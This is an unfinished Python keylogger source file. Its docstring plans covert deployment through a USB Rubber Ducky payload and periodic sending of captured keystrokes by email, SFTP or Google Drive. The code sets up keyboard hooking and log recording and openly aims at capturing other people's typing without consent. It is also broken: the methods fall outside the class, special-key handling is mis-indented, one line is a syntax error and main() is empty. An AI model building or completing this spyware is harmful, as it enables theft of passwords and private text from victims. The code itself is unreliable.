"""
Kinda self explanatory, but a keylogger written in python. Gonna work on making a ducky script that does the exact same thing as this script. This is just kind of an experiment. 
- The ducky script will activate once the USB is inserted into whatever device. Then this script will run. The idea for the script is to either display the keystrokes in real-time or to send a file with the recorded strokes every 5 mins for example to a certain address.
- Can be made to upload to SFTP server or Google Drive API"""


# Imports
import keyboard
import smtplib # If we decide to send the contents via email, not needed for local file saving
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart # For emailing, also not needed for local file saving
from email.mime.text import MIMEText # Also not needed for local file saving 
# Note that for reporting via email, a valid google account is needed for Outlook and enable third-party sign ins via email.

# Constants for sending keystroke report

class Keylogger:
    def __init__(self, interval, report_method="email"): # Constructor
        self.interval = interval
        self.report_method = report_method
        # Variable for logging all keystrokes in 'self.interval'
        self.log = ""
        # Record start and end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
def callback(self, event):
    # Invoked whenever a key is released
    name = event.name
    # If its a special key
    if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            # Add new line when enter is pressed for readability
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            # Replace spaces with underscores
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
        # Add key name to global self.log variable to record
        # When key is released, button pressed is appended to self.log
        self.log += name
        
# Method for saving keystrokes to local file
def update_filename(self):
    # Make the name for the filename to be the start and end times.
    start_dt_str = self.start_dt.strftime("%Y-%m-%d-%H-%M")
    end_dt_str = self.end_dt.strftime("%Y-%m-%d-%H-%M")
    self.filename = f"log-{start_dt_str}_{end_dt_str}"

# Creating a log file in the current directory that contains the logs in 'self.log'
def report_to_file(self):
    # Create file in write mode
    with open()
    
def main():
    pass

if __name__ == "__main__":
    main()
